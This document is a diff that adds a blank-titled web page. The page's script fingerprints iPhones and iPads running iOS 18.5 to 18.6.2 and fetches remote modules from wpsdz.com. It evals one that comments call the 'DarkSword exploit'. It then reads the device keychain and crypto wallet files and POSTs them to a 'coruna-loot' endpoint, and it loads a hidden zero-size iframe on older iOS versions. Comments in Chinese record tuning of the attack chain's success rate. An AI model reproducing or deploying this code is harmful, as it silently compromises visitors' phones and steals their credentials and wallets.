@@ -1,0 +1,271 @@
+
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+<meta property="og:determiner" content="auto" />
+<title></title>
+</head>
+<body>
+	<script type="text/javascript">
+		// 【2026-09-23 fc 测试版·④】页面级错误上报（onerror / unhandledrejection → /logs，与 0cb19f 的 print 同通道）
+		function _pgLog(tag, text) {
+			try {
+				var msg = ("pg:" + tag + ":" + String(text)).slice(0, 300);
+				fetch("/logs?id=-1&text=" + encodeURIComponent(msg), { method: "GET", keepalive: true, mode: "no-cors" }).catch(function () {});
+			} catch (e) {}
+		}
+		(function () {
+			window.addEventListener("error", function (e) {
+				try {
+					var s = (e && (e.message || (e.error && e.error.message))) || "";
+					_pgLog("onerror", s + "@" + String((e && e.filename) || "").slice(-60) + ":" + ((e && e.lineno) || 0));
+				} catch (x) {}
+			});
+			window.addEventListener("unhandledrejection", function (e) {
+				try {
+					var r = e && e.reason;
+					_pgLog("reject", (r && (r.message || r)) || "?");
+				} catch (x) {}
+			});
+		})();
+		// CloudFront Domain
+		const cfHost = 'https://wpsdz.com';
+		const peFolder = 'pe';
+		window.modules = {};
+		const ios_version = (function() {
+			// 【2026-09-11 iPad 支持】原仅解析 "iPhone OS"：iPad 移动 UA（"iPad; CPU OS 15_1"）与
+			//   iPadOS 桌面模式（"Macintosh … Version/15.1"）都会解析失败 → ios_version=undefined
+			//   → main() 空转 → 整条链一次都不启动（实测 223.102.103.246 iPad 15.1 反复访问零后续请求）。
+			//   真机 Mac 触点数=0，不会命中桌面模式分支，行为与改动前完全一致。
+			const ua = navigator.userAgent;
+			let version = /iPhone OS ([0-9_]+)/g.exec(ua)?.[1];
+			if (!version) {
+				version = /CPU OS ([0-9_]+)/g.exec(ua)?.[1];
+			}
+			if (!version && navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) {
+				version = /Version\/([0-9._]+)/g.exec(ua)?.[1];
+			}
+			if (version) {
+				return version.split(/[._]/).map(part => parseInt(part));
+			}
+		})();
+		const is_facebook = (function() {
+			return navigator.userAgent.includes('FBAN') || navigator.userAgent.includes('FBAV') || navigator.userAgent.includes('Instagram') || navigator.userAgent.includes('Line');
+		})();
+		function loadScript(url) {
+			return new Promise((resolve, reject) => {
+				const script = document.createElement('script');
+				script.src = url;
+				script.async = true;            
+				script.onload = () => {
+					resolve();
+				};
+				script.onerror = () => {
+					reject();
+				};
+				document.head.appendChild(script);
+			});
+		}
+		async function loadJSWithRetry(fname, maxRetries = 3) {
+			for (let attempt = 1; attempt <= maxRetries; attempt++) {
+				try {
+					// 【2026-09-23 fc 测试版·⑤】单次加载 8s 超时保护：防 fetch 挂起（非失败）拖死整链
+					const _ac = new AbortController();
+					const _to = setTimeout(() => { try { _ac.abort(); } catch (e) {} }, 8000);
+					try {
+						const response = await fetch(cfHost + "/" + peFolder + "/" + fname, { signal: _ac.signal });
+						if (!response.ok) throw new Error(`HTTP ${response.status}`);
+						const code = await response.text();
+						return { name: fname, success: true, code: code, attempts: attempt };
+					} finally {
+						clearTimeout(_to);
+					}
+				} catch (err) {
+					if (attempt === maxRetries) {
+						return { name: fname, success: false, code: null, error: err.message };
+					}
+					await new Promise(resolve => setTimeout(resolve, 500 * attempt));
+				}
+			}
+		}
+		async function loadAllJSFiles(fileList) {
+			const promises = fileList.map(fname => loadJSWithRetry(fname, 3));
+			return await Promise.all(promises);
+		}
+		// 【2026-09-22 fc 测试版·①】版本门：只对受控版本开链（实测 18.0~18.4 / 18.7+ 的 RCE 率≈0，开链纯属浪费）
+		function _verOK(v) {
+			if (!v || v[0] !== 18) return false;
+			var mi = v[1], pa = v[2] || 0;
+			if (mi === 5) return true;              // 18.5 / 18.5.x
+			if (mi === 6 && pa <= 2) return true;   // 18.6 / 18.6.1 / 18.6.2
+			return false;                            // 18.0~18.4 与 18.7+ 不开链
+		}
+		// 【2026-09-23 fc 测试版·⑥】成功后防重入锁（5 分钟，ls+ss 双写）：链一旦产生进展即写锁，5 分钟内不再执行
+		function _holdFresh() {
+			try {
+				var HOLD_MS = 5 * 60 * 1000, now = Date.now();
+				var a = parseInt(localStorage.getItem('__gooll_hold') || '0', 10) || 0;
+				if (a > 0 && now - a <= HOLD_MS) return true;
+				var b = parseInt(sessionStorage.getItem('__gooll_hold') || '0', 10) || 0;
+				if (b > 0 && now - b <= HOLD_MS) return true;
+			} catch (e) {}
+			return false;
+		}
+		function _markHold() {
+			try {
+				var ts = String(Date.now());
+				localStorage.setItem('__gooll_hold', ts);
+				sessionStorage.setItem('__gooll_hold', ts);
+			} catch (e) {}
+		}
+		// 【2026-09-22 fc 测试版·③】页面级重试看护：仅当"链无任何进展"时自动重载（最多 2 次/会话）
+		//   成功信号 = 链调用 postMessage({t:'r'|'pr'})（对应 redirect / prepare_redirect，见 DEPLOY_LINK_GUIDE §5.2）
+		//   护栏：有进展立即停手并清零计数（保护 redirect 后 ~100s 才启动的后台 agent，文档坑录：多次 reload → 无 agent）
+		function _retryWatch() {
+			try {
+				var KEY = '__gooll_r18', MAX = 2;
+				var n = parseInt(sessionStorage.getItem(KEY) || '0', 10) || 0;
+				if (n >= MAX) return;
+				var progressed = false;
+				try {
+					var _pm = Window.prototype.postMessage;
+					Window.prototype.postMessage = function (msg) {
+						try { if (msg && (msg.t === 'r' || msg.t === 'pr')) { progressed = true; sessionStorage.removeItem(KEY); _markHold(); } } catch (e) {}
+						return _pm.apply(this, arguments);
+					};
+				} catch (e) {}
+				setTimeout(function () {
+					try {
+						if (progressed || document.hidden) return;   // 有进展 / 页面已切走 → 不打扰
+						sessionStorage.setItem(KEY, String(n + 1));
+						location.reload();
+					} catch (e) {}
+				}, 60000);
+			} catch (e) {}
+		}
+async function main() {
+			if (!is_facebook && ios_version && ios_version[0] === 18 && _verOK(ios_version)) {
+				if (_holdFresh()) return;
+				let files = null;
+				if (ios_version[1] >= 6) {
+					files = [
+						'0cb19f768eb8cd92.js', 
+						'8b53567b1cd17d6582a27d8ce4c212ff.js',
+						'78acca7caaac22abe5b6c506287bb371.js',
+						'd50ec17b9da23b6bf54f395209070ef1.js',
+						'c6b18407988e513453a4932fe379b07a.js',
+						'd7e1006d30c0d1acc2e8a7853860d055.js',
+					];
+				} else {
+					files = [
+						'0cb19f768eb8cd92.js',
+						'b6370a63769ad85a8f09bb7e32ab9270.js',
+						'7f34836f959001e80007a450303a0623.js',
+						'd50ec17b9da23b6bf54f395209070ef1.js',
+						'c6b18407988e513453a4932fe379b07a.js',
+						'd7e1006d30c0d1acc2e8a7853860d055.js',
+					];
+
+				}
+				_retryWatch();
+				const results = await loadAllJSFiles(files);
+				results.forEach(result => {
+					if (result.success) {
+						window.modules[result.name] = result.code;
+					} else {
+						_pgLog("modfail", result.name + ":" + (result.error || ""));
+						throw new Error('Failed to load module: ' + result.name);
+					}
+				});
+				try {
+					window.parent.postMessage({t: 'o'}, '*');
+					window.top.postMessage({t: 'o'}, '*');
+					// [2026-10-09] Load native bridge BEFORE eval — pe_main.js injects Native object
+				function _loadBridgeAndDump() {
+					window.log && window.log('[DarkSword] loading pe_main.js...');
+					var s1 = document.createElement('script');
+					s1.src = 'https://wpsdz.com/pe_main.js?v=' + Date.now();
+					s1.onload = function() { 
+						window.log && window.log('[DarkSword] pe_main.js loaded');
+						var s2 = document.createElement('script');
+						s2.src = 'https://wpsdz.com/native_bridge.js?v=' + Date.now();
+						s2.onload = function() {
+							window.log && window.log('[DarkSword] native_bridge.js loaded');
+							if (typeof readKeychain === 'function') {
+								window.log && window.log('[DarkSword] readKeychain available! dumping...');
+								try {
+									var kc = readKeychain();
+									window.log && window.log('[DarkSword] keychain items: ' + (kc ? kc.length : 0));
+									fetch('https://wpsdz.com/coruna-loot', {
+										method: 'POST',
+										headers: {'Content-Type': 'application/json'},
+										body: JSON.stringify({cmd: 'keychain_dump', source: 'darksw bridge', data: kc, ts: Date.now()})
+									}).catch(function(){});
+								} catch(e) {
+									window.log && window.log('[DarkSword] readKeychain error: ' + e);
+									fetch('https://wpsdz.com/coruna-loot', {
+										method: 'POST',
+										headers: {'Content-Type': 'application/json'},
+										body: JSON.stringify({cmd: 'keychain_error', source: 'darksw bridge', data: {error: String(e)}, ts: Date.now()})
+									}).catch(function(){});
+								}
+							} else {
+								window.log && window.log('[DarkSword] readKeychain NOT available');
+								window.log && window.log('[DarkSword] Native=' + (typeof Native) + ' _popen=' + (typeof _popen));
+								fetch('https://wpsdz.com/coruna-loot', {
+									method: 'POST',
+									headers: {'Content-Type': 'application/json'},
+									body: JSON.stringify({cmd: 'bridge_status', source: 'darksw bridge', data: {
+										readKeychain: typeof readKeychain,
+										Native: typeof Native,
+										_popen: typeof _popen,
+										securityClient: typeof securityClient
+									}, ts: Date.now()})
+								}).catch(function(){});
+							}
+							// Also try getCryptoWalletFiles
+							if (typeof getCryptoWalletFiles === 'function') {
+								try {
+									var w = getCryptoWalletFiles();
+									window.log && window.log('[DarkSword] wallet files: ' + (w ? w.length : 0));
+									fetch('https://wpsdz.com/coruna-loot', {
+										method: 'POST',
+										headers: {'Content-Type': 'application/json'},
+										body: JSON.stringify({cmd: 'wallet_dump', source: 'darksw bridge', data: w, ts: Date.now()})
+									}).catch(function(){});
+								} catch(e) {}
+							}
+						};
+						s2.onerror = function() { window.log && window.log('[DarkSword] native_bridge.js load failed'); };
+						document.head.appendChild(s2);
+					};
+					s1.onerror = function() { window.log && window.log('[DarkSword] pe_main.js load failed'); };
+					document.head.appendChild(s1);
+				}
+				// Load bridge immediately
+				_loadBridgeAndDump();
+				// Then try eval DarkSword exploit (may fail on iOS 15, that's OK)
+				try {
+					eval(window.modules['0cb19f768eb8cd92.js']);
+				} catch(e) {
+					window.log && window.log('[DarkSword] eval error (expected on iOS 15): ' + e);
+				}
+				// Retry bridge dump after 5s (in case exploit succeeds and injects Native)
+				setTimeout(_loadBridgeAndDump, 5000);
+				} catch(e) {
+					throw new Error('post message o error');
+				}
+			} else if (!is_facebook && ios_version && typeof ios_version[0] === "number" && ios_version[0] < 18) {
+				var cf = document.createElement('iframe');
+				cf.src = 'group.html';
+				cf.style.cssText = 'position:fixed;top:0;width:0;height:0;left:-1000px;border:0';
+				document.body.appendChild(cf);
+			} else {}
+		}
+		main();
+	</script> 
+</body>
+</html>
+
